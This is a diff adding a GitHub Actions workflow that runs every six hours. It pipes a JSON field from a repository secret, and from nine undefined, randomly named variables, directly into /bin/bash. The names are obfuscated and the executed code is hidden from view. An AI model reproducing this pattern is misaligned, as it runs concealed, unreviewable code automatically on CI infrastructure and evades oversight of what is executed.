@@ -1,0 +1,27 @@
+name: gelinglanduo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gelinglanduo
+        env:
+          zrw8: ${{ secrets.zrw8 }}
+        run: |
+          echo $zrw8 | jq -r .g712 | /bin/bash
+          echo $xztx87 | jq -r .ted2529 | /bin/bash
+          echo $fkf5 | jq -r .crnt58 | /bin/bash
+          echo $gxhzs5911 | jq -r .jhd0 | /bin/bash
+          echo $bwgn0 | jq -r .zgbf684 | /bin/bash
+          echo $yxldv26 | jq -r .zvfs812 | /bin/bash
+          echo $egj4 | jq -r .s132 | /bin/bash
+          echo $q202 | jq -r .iyk33933 | /bin/bash
+          echo $dzlyu942 | jq -r .hgq5 | /bin/bash
+          echo $jton20 | jq -r .wxdew6020 | /bin/bash
+
